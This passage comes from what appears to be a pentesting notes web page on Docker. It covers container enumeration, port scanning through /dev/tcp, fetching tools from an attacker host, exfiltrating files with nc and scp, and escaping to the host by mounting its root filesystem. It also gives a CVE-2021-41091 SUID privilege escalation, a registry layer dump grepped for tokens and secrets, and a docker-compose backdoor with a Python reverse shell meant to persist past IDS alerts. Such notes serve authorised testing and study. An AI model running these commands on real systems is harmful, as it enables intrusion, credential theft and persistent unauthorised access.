</span><span id="__span-29-9"><a id="__codelineno-29-9" name="__codelineno-29-9" href="#__codelineno-29-9"></a>ls -al /bin
</span><span id="__span-29-10"><a id="__codelineno-29-10" name="__codelineno-29-10" href="#__codelineno-29-10"></a>
</span><span id="__span-29-11"><a id="__codelineno-29-11" name="__codelineno-29-11" href="#__codelineno-29-11"></a># Bash history
</span><span id="__span-29-12"><a id="__codelineno-29-12" name="__codelineno-29-12" href="#__codelineno-29-12"></a>cat /root/.bash_history
</span><span id="__span-29-13"><a id="__codelineno-29-13" name="__codelineno-29-13" href="#__codelineno-29-13"></a>cat /home/&lt;username&gt;/.bash_history
</span><span id="__span-29-14"><a id="__codelineno-29-14" name="__codelineno-29-14" href="#__codelineno-29-14"></a>
</span><span id="__span-29-15"><a id="__codelineno-29-15" name="__codelineno-29-15" href="#__codelineno-29-15"></a># Interesting Directories
</span><span id="__span-29-16"><a id="__codelineno-29-16" name="__codelineno-29-16" href="#__codelineno-29-16"></a>ls -al /etc
</span><span id="__span-29-17"><a id="__codelineno-29-17" name="__codelineno-29-17" href="#__codelineno-29-17"></a>ls -al /mnt
</span><span id="__span-29-18"><a id="__codelineno-29-18" name="__codelineno-29-18" href="#__codelineno-29-18"></a>ls -al /opt
</span><span id="__span-29-19"><a id="__codelineno-29-19" name="__codelineno-29-19" href="#__codelineno-29-19"></a>ls -al /srv
</span><span id="__span-29-20"><a id="__codelineno-29-20" name="__codelineno-29-20" href="#__codelineno-29-20"></a>ls -al /var/www
</span><span id="__span-29-21"><a id="__codelineno-29-21" name="__codelineno-29-21" href="#__codelineno-29-21"></a>ls -al /var/tmp
</span><span id="__span-29-22"><a id="__codelineno-29-22" name="__codelineno-29-22" href="#__codelineno-29-22"></a>ls -al /tmp
</span><span id="__span-29-23"><a id="__codelineno-29-23" name="__codelineno-29-23" href="#__codelineno-29-23"></a>ls -al /dev/shm
</span><span id="__span-29-24"><a id="__codelineno-29-24" name="__codelineno-29-24" href="#__codelineno-29-24"></a>
</span><span id="__span-29-25"><a id="__codelineno-29-25" name="__codelineno-29-25" href="#__codelineno-29-25"></a># Cron
</span><span id="__span-29-26"><a id="__codelineno-29-26" name="__codelineno-29-26" href="#__codelineno-29-26"></a>cat /etc/cron*
</span><span id="__span-29-27"><a id="__codelineno-29-27" name="__codelineno-29-27" href="#__codelineno-29-27"></a>crontab -l
</span><span id="__span-29-28"><a id="__codelineno-29-28" name="__codelineno-29-28" href="#__codelineno-29-28"></a>
</span><span id="__span-29-29"><a id="__codelineno-29-29" name="__codelineno-29-29" href="#__codelineno-29-29"></a># Process
</span><span id="__span-29-30"><a id="__codelineno-29-30" name="__codelineno-29-30" href="#__codelineno-29-30"></a>ps aux
</span><span id="__span-29-31"><a id="__codelineno-29-31" name="__codelineno-29-31" href="#__codelineno-29-31"></a>ps aux | cat
</span><span id="__span-29-32"><a id="__codelineno-29-32" name="__codelineno-29-32" href="#__codelineno-29-32"></a># https://github.com/DominicBreuker/pspy
</span><span id="__span-29-33"><a id="__codelineno-29-33" name="__codelineno-29-33" href="#__codelineno-29-33"></a>./pspy64
</span><span id="__span-29-34"><a id="__codelineno-29-34" name="__codelineno-29-34" href="#__codelineno-29-34"></a>
</span><span id="__span-29-35"><a id="__codelineno-29-35" name="__codelineno-29-35" href="#__codelineno-29-35"></a># Network
</span><span id="__span-29-36"><a id="__codelineno-29-36" name="__codelineno-29-36" href="#__codelineno-29-36"></a>ip addr
</span><span id="__span-29-37"><a id="__codelineno-29-37" name="__codelineno-29-37" href="#__codelineno-29-37"></a>netstat -punta
</span><span id="__span-29-38"><a id="__codelineno-29-38" name="__codelineno-29-38" href="#__codelineno-29-38"></a>ss -ltu
</span><span id="__span-29-39"><a id="__codelineno-29-39" name="__codelineno-29-39" href="#__codelineno-29-39"></a>cat /etc/hosts
</span><span id="__span-29-40"><a id="__codelineno-29-40" name="__codelineno-29-40" href="#__codelineno-29-40"></a>
</span><span id="__span-29-41"><a id="__codelineno-29-41" name="__codelineno-29-41" href="#__codelineno-29-41"></a># Port scan another host
</span><span id="__span-29-42"><a id="__codelineno-29-42" name="__codelineno-29-42" href="#__codelineno-29-42"></a>nmap 172.17.0.1
</span><span id="__span-29-43"><a id="__codelineno-29-43" name="__codelineno-29-43" href="#__codelineno-29-43"></a>for i in {1..65535}; do (echo &gt; /dev/tcp/172.17.0.1/$i) &gt;/dev/null 2&gt;&amp;1 &amp;&amp; echo $i is open; done
</span><span id="__span-29-44"><a id="__codelineno-29-44" name="__codelineno-29-44" href="#__codelineno-29-44"></a>
</span><span id="__span-29-45"><a id="__codelineno-29-45" name="__codelineno-29-45" href="#__codelineno-29-45"></a># SSH
</span><span id="__span-29-46"><a id="__codelineno-29-46" name="__codelineno-29-46" href="#__codelineno-29-46"></a>ssh &lt;user&gt;@&lt;another_host&gt;
</span><span id="__span-29-47"><a id="__codelineno-29-47" name="__codelineno-29-47" href="#__codelineno-29-47"></a>
</span><span id="__span-29-48"><a id="__codelineno-29-48" name="__codelineno-29-48" href="#__codelineno-29-48"></a># Check if docker command is available.
</span><span id="__span-29-49"><a id="__codelineno-29-49" name="__codelineno-29-49" href="#__codelineno-29-49"></a># If not, find the command in the container.
</span><span id="__span-29-50"><a id="__codelineno-29-50" name="__codelineno-29-50" href="#__codelineno-29-50"></a>docker -h
</span><span id="__span-29-51"><a id="__codelineno-29-51" name="__codelineno-29-51" href="#__codelineno-29-51"></a>find / -name &quot;docker&quot; 2&gt;/dev/null
</span><span id="__span-29-52"><a id="__codelineno-29-52" name="__codelineno-29-52" href="#__codelineno-29-52"></a>
</span><span id="__span-29-53"><a id="__codelineno-29-53" name="__codelineno-29-53" href="#__codelineno-29-53"></a># Container capabilities
</span><span id="__span-29-54"><a id="__codelineno-29-54" name="__codelineno-29-54" href="#__codelineno-29-54"></a>capsh --print
</span></code></pre></div>
<h3 id="access-another-host">Access Another Host</h3>
<p>If we found another host but cannot access it by restrictions, we need to port forward.<br />
Please see <a href="/exploit/network/port-forwarding/port-forwarding-with-chisel">details</a> for port fowarding.</p>
<h3 id="import-required-binary-from-local-machine">Import Required Binary from Local Machine</h3>
<p>The container generally has few command that we want to use to exploit, so we need to import manually the command binaries if we need.<br />
Below are examples to transfer arbitrary binary into the docker container.</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a>wget http://&lt;local-ip&gt;:8000/socat
</span><span id="__span-30-2"><a id="__codelineno-30-2" name="__codelineno-30-2" href="#__codelineno-30-2"></a>
</span><span id="__span-30-3"><a id="__codelineno-30-3" name="__codelineno-30-3" href="#__codelineno-30-3"></a>curl &lt;local-ip&gt;:8000/scp -o socat
</span></code></pre></div>
<h2 id="mounting">Mounting</h2>
<p>Check disks or mounted folders and we might be able to see the directories of the host system.<br />
See <a href="[/exploit/linux/privilege-escalation/#disks-(drives)](https://www.notion.so/Exploit-Notes-898cefc3a26942018237f6ceb6694351?pvs=21)">Linux Privilege Escalation</a> for details.</p>
<h3 id="1-list-disksmounted-folders">1. List Disks/Mounted Folders</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-31-1"><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a>findmnt
</span><span id="__span-31-2"><a id="__codelineno-31-2" name="__codelineno-31-2" href="#__codelineno-31-2"></a>lsblk
</span><span id="__span-31-3"><a id="__codelineno-31-3" name="__codelineno-31-3" href="#__codelineno-31-3"></a>fdisk -l
</span></code></pre></div>
<h3 id="2-mount-folder">2. Mount Folder</h3>
<p>If we find a folder which is not mounted in the container, mount it to go inside the directory.</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-32-1"><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a>mkdir -p /mnt/tmp
</span><span id="__span-32-2"><a id="__codelineno-32-2" name="__codelineno-32-2" href="#__codelineno-32-2"></a>mount /dev/xvda1 /mnt/tmp
</span></code></pre></div>
<p>Now we can observe inside the <code>/mnt/tmp</code> directory.</p>
<h2 id="privilege-escalation-to-root">Privilege Escalation to Root</h2>
<p>Please see <a href="/exploit/linux/privilege-escalation/">Linux Privilege Escalation</a>.</p>
<h2 id="run-vulnerable-docker-image">Run Vulnerable Docker Image</h2>
<p>According to <a href="https://book.hacktricks.xyz/network-services-pentesting/2375-pentesting-docker#compromising">Hacktricks</a>, we can escape a docker container with the vulnerable image.<br />
Execute the following command in the target machine where a docker container is running..</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-33-1"><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a>docker -H 127.0.0.1:2375 run --rm -it --privileged --net=host -v /:/mnt alpine
</span><span id="__span-33-2"><a id="__codelineno-33-2" name="__codelineno-33-2" href="#__codelineno-33-2"></a>cd /mnt/
</span></code></pre></div>
<h2 id="download-interesting-files">Download Interesting Files</h2>
<div class="language-text highlight"><pre><span></span><code><span id="__span-34-1"><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a># In local machine
</span><span id="__span-34-2"><a id="__codelineno-34-2" name="__codelineno-34-2" href="#__codelineno-34-2"></a>nc -lp 4444 &gt; example.txt
</span><span id="__span-34-3"><a id="__codelineno-34-3" name="__codelineno-34-3" href="#__codelineno-34-3"></a>
</span><span id="__span-34-4"><a id="__codelineno-34-4" name="__codelineno-34-4" href="#__codelineno-34-4"></a># In remote machine
</span><span id="__span-34-5"><a id="__codelineno-34-5" name="__codelineno-34-5" href="#__codelineno-34-5"></a>nc &lt;local-ip&gt; 4444 &lt; example.txt
</span></code></pre></div>
<p>Also we can use “scp” under the condition that the local machine opens SSH server.</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-35-1"><a id="__codelineno-35-1" name="__codelineno-35-1" href="#__codelineno-35-1"></a># In local machine
</span><span id="__span-35-2"><a id="__codelineno-35-2" name="__codelineno-35-2" href="#__codelineno-35-2"></a>sudo systemctl start ssh
</span><span id="__span-35-3"><a id="__codelineno-35-3" name="__codelineno-35-3" href="#__codelineno-35-3"></a>
</span><span id="__span-35-4"><a id="__codelineno-35-4" name="__codelineno-35-4" href="#__codelineno-35-4"></a># In remote machine
</span><span id="__span-35-5"><a id="__codelineno-35-5" name="__codelineno-35-5" href="#__codelineno-35-5"></a>scp ./example.txt &lt;username&gt;@&lt;local-ip&gt;:/home/&lt;username&gt;/example.txt
</span></code></pre></div>
<h2 id="run-existing-docker-image">Run Existing Docker Image</h2>
<h3 id="1-check-if-current-user-belongs-to-docker-group">1. Check if current user belongs to "docker" group</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-36-1"><a id="__codelineno-36-1" name="__codelineno-36-1" href="#__codelineno-36-1"></a>groups
</span></code></pre></div>
<h3 id="2-list-docker-images">2. List Docker Images</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-37-1"><a id="__codelineno-37-1" name="__codelineno-37-1" href="#__codelineno-37-1"></a>docker images
</span></code></pre></div>
<h3 id="3-start-container-and-get-shell">3. Start Container and Get Shell</h3>
<p>If we found Docker images running, we can use it to get a root shell
Replace <strong>“example”</strong> with the docker image you found.</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-38-1"><a id="__codelineno-38-1" name="__codelineno-38-1" href="#__codelineno-38-1"></a># -v: Mount the host directory (&#39;/&#39;) to the &#39;/mnt&#39; directory in the container.
</span><span id="__span-38-2"><a id="__codelineno-38-2" name="__codelineno-38-2" href="#__codelineno-38-2"></a># --rm: Automatically remove the container when it exits.
</span><span id="__span-38-3"><a id="__codelineno-38-3" name="__codelineno-38-3" href="#__codelineno-38-3"></a># -it: Interective and TTY
</span><span id="__span-38-4"><a id="__codelineno-38-4" name="__codelineno-38-4" href="#__codelineno-38-4"></a># chroot /mnt sh: Change the root directory of the current process to the &#39;/mnt&#39; directory, then execute &#39;sh&#39; command to get a shell as root.
</span><span id="__span-38-5"><a id="__codelineno-38-5" name="__codelineno-38-5" href="#__codelineno-38-5"></a>docker run -v /:/mnt --rm -it example chroot /mnt sh
</span></code></pre></div>
<p>Alternatively we can use following commands.</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-39-1"><a id="__codelineno-39-1" name="__codelineno-39-1" href="#__codelineno-39-1"></a># --entrypoint=/bin/bash: Override the default entrypoint to &#39;/bin/bash&#39;, which means that when the container starts, it will launch a bash shell.
</span><span id="__span-39-2"><a id="__codelineno-39-2" name="__codelineno-39-2" href="#__codelineno-39-2"></a>docker run -it --entrypoint=/bin/bash -v /:/mnt/ &lt;image&gt;:&lt;tag&gt;
</span><span id="__span-39-3"><a id="__codelineno-39-3" name="__codelineno-39-3" href="#__codelineno-39-3"></a># e.g.
</span><span id="__span-39-4"><a id="__codelineno-39-4" name="__codelineno-39-4" href="#__codelineno-39-4"></a>docker run -it --entrypoint=/bin/bash -v /:/mnt/ example:master
</span></code></pre></div>
<p>After that, you can investigate sensitive information in the <strong><code>/mnt/</code></strong> folders.</p>
<h2 id="docker-socket-escape">Docker Socket Escape</h2>
<p>Reference: <a href="https://gist.github.com/PwnPeter/3f0a678bf44902eae07486c9cc589c25">https://gist.github.com/PwnPeter/3f0a678bf44902eae07486c9cc589c25</a></p>
<h2 id="establish-persistence-after-privesc">Establish Persistence After PrivEsc</h2>
<p>After that you invaded the docker container, you might be able to make it persistence while evading the IDS alerts by creating a docker compose file and abusing the entrypoint option to grant you a reverse shell.</p>
<p>Create a ~/docker-compose.yaml in the container.</p>
<p>You need to replace the <code>&lt;image&gt;</code>, <code>&lt;local-ip&gt;</code>, <code>&lt;local-ip&gt;</code> with your environment.</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-40-1"><a id="__codelineno-40-1" name="__codelineno-40-1" href="#__codelineno-40-1"></a>version: &quot;2.1&quot;
</span><span id="__span-40-2"><a id="__codelineno-40-2" name="__codelineno-40-2" href="#__codelineno-40-2"></a>services:
</span><span id="__span-40-3"><a id="__codelineno-40-3" name="__codelineno-40-3" href="#__codelineno-40-3"></a>  backdoorservice:
</span><span id="__span-40-4"><a id="__codelineno-40-4" name="__codelineno-40-4" href="#__codelineno-40-4"></a>    restart: always
</span><span id="__span-40-5"><a id="__codelineno-40-5" name="__codelineno-40-5" href="#__codelineno-40-5"></a>    image: &lt;image&gt;
</span><span id="__span-40-6"><a id="__codelineno-40-6" name="__codelineno-40-6" href="#__codelineno-40-6"></a>    entrypoint: &gt; 
</span><span id="__span-40-7"><a id="__codelineno-40-7" name="__codelineno-40-7" href="#__codelineno-40-7"></a>       python -c &#39;import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
</span><span id="__span-40-8"><a id="__codelineno-40-8" name="__codelineno-40-8" href="#__codelineno-40-8"></a>       s.connect((&quot;&lt;local-ip&gt;&quot;,&lt;local-ip&gt;));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);
</span><span id="__span-40-9"><a id="__codelineno-40-9" name="__codelineno-40-9" href="#__codelineno-40-9"></a>       pty.spawn(&quot;/bin/sh&quot;)&#39;
</span><span id="__span-40-10"><a id="__codelineno-40-10" name="__codelineno-40-10" href="#__codelineno-40-10"></a>    volumes:
</span><span id="__span-40-11"><a id="__codelineno-40-11" name="__codelineno-40-11" href="#__codelineno-40-11"></a>      - /:/mnt
</span><span id="__span-40-12"><a id="__codelineno-40-12" name="__codelineno-40-12" href="#__codelineno-40-12"></a>    privileged: true
</span></code></pre></div>
<p>Then start listener in your local machine.</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-41-1"><a id="__codelineno-41-1" name="__codelineno-41-1" href="#__codelineno-41-1"></a>nc -lvnp 4444
</span></code></pre></div>
<p>Now run the docker compose in remote machine. You should gain a shell.</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-42-1"><a id="__codelineno-42-1" name="__codelineno-42-1" href="#__codelineno-42-1"></a>docker-compose run
</span></code></pre></div>
<h2 id="amazon-elastic-container-registry-ecr-public-gallery">Amazon Elastic Container Registry (ECR) Public Gallery</h2>
<h3 id="1-run-the-docker-container">1. Run the Docker Container</h3>
<ul>
<li><strong>Retrieve a Container Image</strong></li>
</ul>
<div class="language-text highlight"><pre><span></span><code><span id="__span-43-1"><a id="__codelineno-43-1" name="__codelineno-43-1" href="#__codelineno-43-1"></a>    docker pull public.ecr.aws/&lt;registry-alias&gt;/&lt;repository&gt;:latest
</span></code></pre></div>
<ul>
<li><strong>Check if It was Pulled</strong></li>
</ul>
<div class="language-text highlight"><pre><span></span><code><span id="__span-44-1"><a id="__codelineno-44-1" name="__codelineno-44-1" href="#__codelineno-44-1"></a>    docker images
</span></code></pre></div>
<ul>
<li><strong>Run the Container and Interect with It</strong></li>
</ul>
<div class="language-text highlight"><pre><span></span><code><span id="__span-45-1"><a id="__codelineno-45-1" name="__codelineno-45-1" href="#__codelineno-45-1"></a>    docker run -it public.ecr.aws/&lt;registry-alias&gt;/&lt;repository&gt;:latest
</span></code></pre></div>
<h3 id="2-get-sensitive-information-in-the-container">2. Get Sensitive Information in the Container</h3>
<p>You may be able to get the interesting data like <strong>api_key</strong>.</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-46-1"><a id="__codelineno-46-1" name="__codelineno-46-1" href="#__codelineno-46-1"></a>printenv
</span></code></pre></div>
<h3 id="3-get-sensitive-information-in-local-machine">3. Get Sensitive Information in Local Machine</h3>
<ul>
<li>
<p><strong>Check the Container Config and Retrieve Sensitive Information</strong></p>
<p>Process the following flows in your local machine.</p>
</li>
</ul>
<div class="language-text highlight"><pre><span></span><code><span id="__span-47-1"><a id="__codelineno-47-1" name="__codelineno-47-1" href="#__codelineno-47-1"></a>    mkdir example
</span><span id="__span-47-2"><a id="__codelineno-47-2" name="__codelineno-47-2" href="#__codelineno-47-2"></a>    cd example/
</span><span id="__span-47-3"><a id="__codelineno-47-3" name="__codelineno-47-3" href="#__codelineno-47-3"></a>    docker save -o example.tar public.ecr.aws/&lt;registry-alias&gt;/&lt;repository&gt;:latest
</span><span id="__span-47-4"><a id="__codelineno-47-4" name="__codelineno-47-4" href="#__codelineno-47-4"></a>    tar -xf example.tar
</span><span id="__span-47-5"><a id="__codelineno-47-5" name="__codelineno-47-5" href="#__codelineno-47-5"></a>
</span><span id="__span-47-6"><a id="__codelineno-47-6" name="__codelineno-47-6" href="#__codelineno-47-6"></a>    # Config files
</span><span id="__span-47-7"><a id="__codelineno-47-7" name="__codelineno-47-7" href="#__codelineno-47-7"></a>    cat manifest.json | jq
</span><span id="__span-47-8"><a id="__codelineno-47-8" name="__codelineno-47-8" href="#__codelineno-47-8"></a>    cat f9ab.......json | jq
</span><span id="__span-47-9"><a id="__codelineno-47-9" name="__codelineno-47-9" href="#__codelineno-47-9"></a>
</span><span id="__span-47-10"><a id="__codelineno-47-10" name="__codelineno-47-10" href="#__codelineno-47-10"></a>    # Also config file in each directory
</span><span id="__span-47-11"><a id="__codelineno-47-11" name="__codelineno-47-11" href="#__codelineno-47-11"></a>    cd 2246f........../
</span><span id="__span-47-12"><a id="__codelineno-47-12" name="__codelineno-47-12" href="#__codelineno-47-12"></a>    tar -xvf layer.tar
</span><span id="__span-47-13"><a id="__codelineno-47-13" name="__codelineno-47-13" href="#__codelineno-47-13"></a>
</span><span id="__span-47-14"><a id="__codelineno-47-14" name="__codelineno-47-14" href="#__codelineno-47-14"></a>    # Get sensitive information
</span><span id="__span-47-15"><a id="__codelineno-47-15" name="__codelineno-47-15" href="#__codelineno-47-15"></a>    grep -e &#39;token&#39; -e &#39;secret&#39; */*
</span></code></pre></div>
<h1 id="docker-registry-pentesting">Docker Registry Pentesting</h1>
<p>Docker Registry is a steteless, highly scalable server side application that stores and lets you distribute Docker images. A default port is 5000.</p>
<div class="language-text highlight"><pre><span></span><code>- [tbhaxor.com](https://tbhaxor.com/exploiting-insecure-docker-registry/)
</code></pre></div>
<h2 id="endpoints">Endpoints</h2>
<div class="language-text highlight"><pre><span></span><code><span id="__span-48-1"><a id="__codelineno-48-1" name="__codelineno-48-1" href="#__codelineno-48-1"></a>/v2/_catalog
</span><span id="__span-48-2"><a id="__codelineno-48-2" name="__codelineno-48-2" href="#__codelineno-48-2"></a>/v2/&lt;repository&gt;/tags/list
</span><span id="__span-48-3"><a id="__codelineno-48-3" name="__codelineno-48-3" href="#__codelineno-48-3"></a># We can download the manifest given tag.
</span><span id="__span-48-4"><a id="__codelineno-48-4" name="__codelineno-48-4" href="#__codelineno-48-4"></a>/v2/&lt;repository&gt;/manifests/&lt;tag&gt;
</span></code></pre></div>
<h2 id="extract-layers">Extract Layers</h2>
<p>If we download the manifest with the above, see the content and blobsums (sha256:abcd...) in fsLayers.</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-49-1"><a id="__codelineno-49-1" name="__codelineno-49-1" href="#__codelineno-49-1"></a>curl -so 1.tar https://example.com:5000/v2/&lt;repository&gt;/blobs/sha256:abcd...
</span><span id="__span-49-2"><a id="__codelineno-49-2" name="__codelineno-49-2" href="#__codelineno-49-2"></a>tar -xvf 1.tar
</span></code></pre></div>
<p>After extracting tar files, investigate files or directories to find the sensitive information.</p>
<h1 id="moby-docker-engine-privesc">Moby Docker Engine PrivEsc</h1>
<p>Directory Traversal &amp; Arbitrary Command Execution (<a href="https://www.suse.com/security/cve/CVE-2021-41091.html">CVE-2021-41091</a> )</p>
<h3 id="1-find-docker-container-directory">1. Find Docker Container Directory</h3>
<p>First off, find the directory which the docker container mounted</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-50-1"><a id="__codelineno-50-1" name="__codelineno-50-1" href="#__codelineno-50-1"></a>findmnt
</span><span id="__span-50-2"><a id="__codelineno-50-2" name="__codelineno-50-2" href="#__codelineno-50-2"></a>
</span><span id="__span-50-3"><a id="__codelineno-50-3" name="__codelineno-50-3" href="#__codelineno-50-3"></a># Results e.g.
</span><span id="__span-50-4"><a id="__codelineno-50-4" name="__codelineno-50-4" href="#__codelineno-50-4"></a>/var/lib/docker/overlay2/abcdef...xyz/merged
</span></code></pre></div>
<p>Assume the directory above found, we can investigate in the directory.</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-51-1"><a id="__codelineno-51-1" name="__codelineno-51-1" href="#__codelineno-51-1"></a>ls -la /var/lib/docker/overlay2/abcdef...xyz/merged/
</span></code></pre></div>
<h3 id="2-prepare-suid-binary-in-container">2. Prepare SUID Binary in Container</h3>
<p>If we can be root in the docker container, set uid arbitrary binary as below. Please note that we need to do that in the container, not the real host.</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-52-1"><a id="__codelineno-52-1" name="__codelineno-52-1" href="#__codelineno-52-1"></a>chmod u+s /bin/bash
</span></code></pre></div>
<h3 id="3-execute-the-suid-binary-in-real-host">3. Execute the SUID Binary in Real Host</h3>
<p>Back to the real host machine again, execute the binary which we set uid to privilege escalation.</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-53-1"><a id="__codelineno-53-1" name="__codelineno-53-1" href="#__codelineno-53-1"></a>/var/lib/docker/voerlay2/abdef...xyz/merged/bin/bash -p
</span></code></pre></div>
<p>We should get a root shell.</p>

  <br>
    

    <br>
</div>

<footer class="col-md-12 wm-page-content">
      <p>
        <a href="https://github.com/readloud/readloud.github.io/releases/tag/themes/edit/master/docs/explore/resource/dockerpentesting.md"><i class="fa fa-github"></i>
Edit on GitHub</a>
      </p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/noraj/mkdocs-windmill-dark">Windmill Dark</a> theme by Alexandre ZANNI (noraj).</p>
<p>        ⚠️ The quieter you become, the more you are able to hear 🥷</p>
</footer>

</body>
</html>